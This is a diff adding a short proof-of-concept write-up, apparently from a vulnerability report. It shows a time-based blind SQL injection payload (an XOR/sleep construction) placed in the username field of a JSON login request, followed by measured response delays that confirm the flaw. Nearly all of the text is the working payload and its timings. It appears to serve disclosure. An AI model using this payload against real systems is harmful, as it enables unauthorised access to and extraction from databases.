@@ -1,0 +1,9 @@
+payload=  0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z
+{"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z","id":"27","password":"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956"}
+Which resulted in a 35 seconds delayed response (one of the print screens, named 35 captured this).
+Using various values for the sleep function you get various time responses.
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332
+0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337
